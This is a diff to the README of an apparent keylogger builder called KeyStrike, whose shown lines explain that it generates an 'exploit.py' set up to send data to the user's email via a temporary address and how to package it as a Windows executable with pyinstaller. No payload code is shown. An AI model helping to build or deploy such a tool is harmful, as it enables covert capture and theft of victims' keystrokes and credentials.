@@ -12,7 +12,7 @@ python3 KeyStrike.py
 ```
 An `exploit.py` file will be generated with your email info where you want to send with a temporary email. To run this exploit on windows you have to convert it to `.exe` file.
 
-You can generate it with `pyinstaller` just run this command:
+You can generate it with `pyinstaller` just run this command but you should run this command in windows not in linux:
 
 ```
 pyinstaller --onefile exploit.py
